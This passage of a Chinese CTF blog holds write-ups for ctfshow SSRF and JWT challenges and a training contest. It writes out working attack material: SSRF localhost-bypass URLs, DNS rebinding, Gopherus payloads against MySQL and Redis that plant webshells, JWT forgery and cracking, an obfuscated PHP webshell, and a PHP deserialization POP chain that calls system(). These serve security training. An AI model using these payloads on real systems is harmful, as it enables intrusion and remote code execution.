title="web354"></a>web354</h2><p>题目</p><p><img src="../images/image-20230120163438468.png" alt="image-20230120163438468"></p><p>把1  0  都给过滤掉了。</p><p><strong>解法一</strong></p><p>使用 <code>http://sudo.cc</code>这个域名就是指向127.0.0.1</p><p><strong>解法二</strong></p><p>302跳转  —-&gt;  题目出现<strong>parse_url</strong>时可以用    (<strong>我猜的</strong>)   仅供参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php中，302不是错误，而是HTTP响应状态码，意思为“临时重定向”，表示被访问页面因为各种需要被临时跳转到其他页面；可利用header()来实现302跳转，语法“header(&#x27;Location: 跳转url&#x27;,true,302)”。</span><br></pre></td></tr></table></figure><p>就是在自己的vps上搭建一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;);</span><br></pre></td></tr></table></figure><p><strong>解法三</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自己去ceye.io注册绑定127.0.0.1然后记得前面加r</span><br><span class="line"></span><br><span class="line">url=http://r.xxxzc8.ceye.io/flag.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230120164945293.png" alt="image-20230120164945293"></p><p>如果自己的Identifier里有0或者1的话就用不了了。</p><p><img src="../images/image-20230120165033153.png" alt="image-20230120165033153"></p><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><p>题目</p><p><img src="../images/image-20230120165540423.png" alt="image-20230120165540423"></p><p>这里的话长度给了限制，就是长度小于5</p><p>这里先了解一下<code>parse_url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</span><br><span class="line">数组中可能的键有以下几种：</span><br><span class="line">scheme - 如 http</span><br><span class="line">host</span><br><span class="line">port</span><br><span class="line">user</span><br><span class="line">pass</span><br><span class="line">path</span><br><span class="line">query - 在问号 ? 之后</span><br><span class="line">fragment - 在散列符号 # 之后</span><br><span class="line">    </span><br><span class="line"># 例：</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;    </span><br><span class="line"># 输出</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>题目</p><p><img src="../images/image-20230120165847080.png" alt="image-20230120165847080"></p><p>这里的话是限制长度到3位了</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line"># 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</span><br></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><p>题目</p><p><img src="../images/image-20230120170031431.png" alt="image-20230120170031431"></p><p>我们先来分析一下上图中出现的函数的意思</p><p><strong>先来看下 gethostbyname 函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gethostbyname — 返回主机名对应的 IPv4地址</span><br></pre></td></tr></table></figure><p><strong>filter_var()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># php filter函数</span><br><span class="line">filter_var()获取一个变量，并进行过滤</span><br><span class="line">filter_var_array()获取多个变量，并进行过滤</span><br><span class="line">......</span><br><span class="line"># PHP 过滤器</span><br><span class="line">FILTER_VALIDATE_IP把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围</span><br><span class="line">FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</span><br><span class="line">FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</span><br><span class="line">FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</span><br><span class="line">FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</span><br></pre></td></tr></table></figure><p>因为代码中使用了 gethostbyname 获取了真实 IP 地址，所以域名指向方法不能再使用，可以使用 302 跳转方法和 dns rebinding 方法</p><p>DNS rebinding（DNS重新绑定攻击）</p><p>攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略</p><p>回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP</p><p><img src="../images/image-20230120172635780.png" alt="image-20230120172635780"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://r.自己的域名.ceye.io/flag.php</span><br><span class="line"># 注意前边要加上r.</span><br><span class="line"># 多次尝试</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230120174137568.png" alt="image-20230120174137568"></p><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><p>题目</p><p><img src="../images/image-20230120174311310.png" alt="image-20230120174311310"></p><p>url 字符串要以 <code>http://ctf</code>开头，<code>show</code>结尾</p><p>这里在讲一遍这个<code>parse_url</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</span><br><span class="line">数组中可能的键有以下几种：</span><br><span class="line">scheme - 如 http</span><br><span class="line">host</span><br><span class="line">port</span><br><span class="line">user</span><br><span class="line">pass</span><br><span class="line">path</span><br><span class="line">query - 在问号 ? 之后</span><br><span class="line">fragment - 在散列符号 # 之后</span><br><span class="line">    </span><br><span class="line"># 例：</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;    </span><br><span class="line"># 输出</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是根据这个函数的特性来获取flag</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure><h2 id="web359-打无密码的mysql"><a href="#web359-打无密码的mysql" class="headerlink" title="web359(打无密码的mysql)"></a>web359(打无密码的mysql)</h2><p>题目</p><p><img src="../images/image-20230120180442260.png" alt="image-20230120180442260"></p><p><img src="../images/image-20230120180638216.png" alt="image-20230120180638216"></p><p>点击login抓包发现存在returl这个东西，后面还跟着http网址，所以猜测是ssrf</p><p>工具下载地址<code>https://github.com/tarunkant/Gopherus</code></p><p>使用 gopher 协议去打 mysql</p><p>用 gopherus 工具生成 payload</p><p>使用方法可以自己去看，这里的话不知道什么原因，我python用不了,就直接用下面的语句了</p><p><img src="../images/image-20230120230529676.png" alt="image-20230120230529676"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopherus --exploit mysql</span><br></pre></td></tr></table></figure><p>记得得把_后面的url编码在进行一次编码（防止出现特殊字符，后端 curl 接收到参数后会默认解码一次）   然后进行抓包发送，然后在访问2.php进行rce</p><p><img src="../images/image-20230120230800699.png" alt="image-20230120230800699"></p><p><img src="../images/image-20230120230910057.png" alt="image-20230120230910057"></p><h2 id="web360-Redis"><a href="#web360-Redis" class="headerlink" title="web360(Redis)"></a>web360(Redis)</h2><p>题目</p><p><img src="../images/image-20230121163014199.png" alt="image-20230121163014199"></p><p>代码其实和前面的常规ssrf题差不多</p><p>对redis的介绍 —-&gt;   <a href="https://www.cnblogs.com/powertoolsteam/p/redis.html">https://www.cnblogs.com/powertoolsteam/p/redis.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">什么是Redis未授权访问？</span><br><span class="line"></span><br><span class="line">Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</span><br><span class="line"></span><br><span class="line">简单说，漏洞的产生条件有以下两点：</span><br><span class="line"></span><br><span class="line">redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</span><br><span class="line">没有设置密码认证（一般为空），可以免密码远程登录redis服务</span><br></pre></td></tr></table></figure><p>对redis进行操作得用到dict协议  —-&gt;   <strong>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</strong></p><p><img src="../images/image-20230121163628812.png" alt="image-20230121163628812"></p><p>出现这种情况说明存在redis服务。</p><p>这里就直接可以利用gopherus工具，这个工具可以生成多种payload</p><p><img src="../images/image-20230121163810218.png" alt="image-20230121163810218"></p><p>这道题就直接生成payload拿来打就行了。</p><p><img src="../images/image-20230121170818566.png" alt="image-20230121170818566"></p><p>然后将_后面的语句进行url编码就行了，post后，访问shell.php,然后进行rce就行了。</p><p><img src="../images/image-20230121171016810.png" alt="image-20230121171016810"></p><p>出现这种情况就是shell写入成功，然后进行rce就行了。</p><p>这篇文章的话写的很好在结尾的话给了一些补充 —&gt; <a href="https://blog.csdn.net/q20010619/article/details/120536552">https://blog.csdn.net/q20010619/article/details/120536552</a></p><p>可以自己去参考一下</p><p>这篇文章的话概括了几乎全部的SSRF攻击内容  ——-&gt;   <a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF ctfshow 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-JWT 刷题记录</title>
      <link href="/posts/f8d4789.html"/>
      <url>/posts/f8d4789.html</url>
      
        <content type="html"><![CDATA[<p>JWT —-&gt;<a href="https://zhuanlan.zhihu.com/p/86937325">https://zhuanlan.zhihu.com/p/86937325</a></p><p>可以去看看这篇文章了解一下啥是JWT(如果觉得不好，可以自己去搜一下，网上挺多人讲的这个)</p><p>jwt解密网站<code>https://jwt.io/</code></p><p>前置知识<br>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。<br>设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。</p><p>这篇文章介绍了jwt和其的几种攻击方法  —-&gt;  <a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p><p>这篇文章几乎概括了所有的jwt攻击的方法  —-&gt;  <a href="https://www.cnblogs.com/HelloCTF/p/15748380.html">https://www.cnblogs.com/HelloCTF/p/15748380.html</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>题目</p><p><img src="../images/image-20230119164512413.png" alt="image-20230119164512413"></p><p>然后查看源代码发现了提示。</p><p><img src="../images/image-20230119164723959.png" alt="image-20230119164723959"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里说一下url/admin    和  url/admin/的区别</span><br><span class="line">前者是访问admin这个文件   后者是访问amdin目录下的index.php or  index.jsp  index.aspx</span><br></pre></td></tr></table></figure><p>payload  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">去访问/admin/然后就把cookie拿出来进行base64解码，然后把user修改成admin，在进行base64编码，然后重新提交cookie到/admin/，就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>题目<img src="../images/image-20230119165715347.png" alt="image-20230119165715347"></p><p><img src="../images/image-20230119195246730.png" alt="image-20230119195246730"></p><p>拿着cookie去jwt.io解密平台查看了一下，发现是存在HS256加密的，那么我们就得去想办法获得密钥了。</p><p>然后盲猜一下是123456，结果对了，然后访问/admin/就能拿到flag了。(还是得把user修改成admin)</p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>题目</p><p><img src="../images/image-20230119195558015.png" alt="image-20230119195558015"></p><p>还是这个玩意</p><p>还是和web348一样，直接猜密码是123456.</p><p>然后就可以解出来了。</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>题目</p><p><img src="../images/image-20230119200532621.png" alt="image-20230119200532621"></p><p>利用jwt爆破攻击爆破<br>下载地址<code>https://github.com/brendan-rius/c-jwt-cracker</code>具体安装方法文档中有。<br>使用方法 <code>./jwtcrack jwt</code></p><p><img src="../images/image-20230119202324686.png" alt="image-20230119202324686"></p><p>跑半天才给我跑出来</p><p><img src="../images/image-20230119202436473.png" alt="image-20230119202436473"></p><p>然后就去修改cookie访问/admin/就可以拿到flag了。</p><h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p><img src="../images/image-20230119203323957.png" alt="image-20230119203323957"></p><p>这里拿到cookie去访问的话，得到这里是RS256加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</span><br></pre></td></tr></table></figure><p>利用私钥生成jwt，利用公钥解密jwt，所以我们只要有私钥然后自己重新生成就可以了。<br>访问/private.key得到私钥  这里的考点就是私钥泄露</p><p><img src="../images/image-20230119205202772.png" alt="image-20230119205202772"></p><p>这里给的是题目的源码。</p><p><strong>解法</strong></p><p><img src="../images/image-20230119205933972.png" alt="image-20230119205933972"></p><p>先创建一个public目录</p><p>然后进入新建的route目录，修改一下源码，把题目给的源码复制进去。(注意把user改成admin)</p><p><img src="../images/image-20230119210233365.png" alt="image-20230119210233365"></p><p>然后把题目上的private.key下载到public目录</p><p><img src="../images/image-20230119210443791.png" alt="image-20230119210443791"></p><p><a href="https://www.bilibili.com/video/BV1vU4y187HE/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">web349_哔哩哔哩_bilibili</a></p><p>看这个视频跟着做吧，我写不下去了，就是跟着这个视频做的，然后在遇到相同的题可以跟据这个模板来做，因为环境已经搭好了，只需要把题目给的源码给进行修改就行了。</p><h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>题目</p><p><img src="../images/image-20230119214505677.png" alt="image-20230119214505677"></p><p>访问/public.key获得公钥<br>jwt攻击参考文章<code>https://xz.aliyun.com/t/2338</code><br>这个题是利用的第三种<br><img src="../images/20201230165107811.png" alt="在这里插入图片描述"></p><p><img src="../images/image-20230119215019473.png" alt="image-20230119215019473"></p><p>这道题查看源码发现private.key是给放到route目录下了，那么我们就不可以去拿到private.key,然后进行生成新的cookie了，那么我们就得通过修改加密算法，用公钥来解题。</p><p><img src="../images/image-20230119215315985.png" alt="image-20230119215315985"></p><p>修改一下route里的代码，然后npm start 启动3000端口，拿到cookie，就去题目修改cookie，post发包就可以了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow JWT 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三校联合训练赛web wp</title>
      <link href="/posts/47456b21.html"/>
      <url>/posts/47456b21.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="BuyBuyBuy"><a href="#BuyBuyBuy" class="headerlink" title="BuyBuyBuy"></a><strong>BuyBuyBuy</strong></h3><p><img src="../images/image-20230115170900853.png" alt="image-20230115170900853"></p><p>打开题目  发现是买flag的题目 题目还给了源码，这不是送分吗(狗头)</p><p><img src="../images/image-20230115171139731.png" alt="image-20230115171139731"></p><p>一共两处地方，<strong>/login和/buyflag</strong>  而且通过查看源码和题目的cookie，发现是一道jwt类型的题目</p><p>然后就去了解了一下，jwt是什么，然后就知道是通过修改cookie来获得flag的。</p><p>jwt解密网站<code>https://jwt.io/</code></p><p><img src="../images/image-20230115171545935.png" alt="image-20230115171545935"></p><p>访问/login然后输入get传个usrname的参数，就可以拿到cookie值，然后拿去jwt解密网站去解密</p><p><img src="../images/image-20230115171709619.png" alt="image-20230115171709619"></p><p><strong>secret不知道</strong>    大概去找了找，没找到，就直接利用工具去破解拿到secret了。</p><p><strong>利用jwt爆破攻击爆破</strong><br>下载地址<code>https://github.com/brendan-rius/c-jwt-cracker</code>具体安装方法文档中有。<br>使用方法 ./jwtcrack jwt</p><p><img src="../images/image-20230115171846564.png" alt="image-20230115171846564"></p><p>然后拿到secret，就去jwt解密网站去修改money和secret</p><p><img src="../images/image-20230115172145729.png" alt="image-20230115172145729"></p><p>然后就去访问/buyflag去买flag。</p><p><img src="../images/image-20230115172114903.png" alt="image-20230115172114903"></p><p>然后就拿到flag了。</p><h3 id="EasyRCE"><a href="#EasyRCE" class="headerlink" title="EasyRCE"></a><strong>EasyRCE</strong></h3><p><img src="../images/image-20230115172921998.png" alt="image-20230115172921998"></p><p>一道<strong>无数字字母的rce</strong>  (大写字母其实可以不加)(狗头)</p><p>直接上网找就行了，网上有payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line"></span><br><span class="line">// 密码为 &quot;_&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115173206199.png" alt="image-20230115173206199"></p><p>拿到flag.</p><h3 id="EzPOP"><a href="#EzPOP" class="headerlink" title="EzPOP"></a><strong>EzPOP</strong></h3><p><img src="../images/image-20230115173342461.png" alt="image-20230115173342461"></p><p>一道php的反序列化pop链的构造，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路是这样的通过__destruct()  -&gt;  __toString()   -&gt;__get()  -&gt;   __invoke()</span><br></pre></td></tr></table></figure><p>就是这样的一条链子，他的难点在与怎么传参的问题。</p><p>这个问题也困扰了我好久</p><p>然后经过漫长长长的尝试，然后就尝试成功了，我们可以构造一个新的函数来进行传参。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is cmd :&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; name -&gt; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EEE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">EEE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">aa</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">bb</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="keyword">var</span>=<span class="variable">$aa</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后拿生成的链子去打就能拿到flag了。</p><h3 id="HappyNewYear"><a href="#HappyNewYear" class="headerlink" title="HappyNewYear"></a><strong>HappyNewYear</strong></h3><p><img src="../images/image-20230115174012742.png" alt="image-20230115174012742"></p><p>一道简单的关于php特性的题目</p><p>绕过第一层判断可以利用数字加字母的形式就行了，字母必须得加在数字的后面，不然会被判断为0；</p><p>第二层判断可以在本地来进行判断，因为可能传的payload错了，但不知道是哪边没过  这里可以利用<code>%0a</code>进行绕过。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?year=2023a&amp;key=happyNewYear%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115174511475.png" alt="image-20230115174511475"></p><p>剩下的java反序列化  和一道长长的反序列化题，目前水平不够，解不了了。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 三校联合 web wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-XSS-刷题记录</title>
      <link href="/posts/c697f3a9.html"/>
      <url>/posts/c697f3a9.html</url>
      
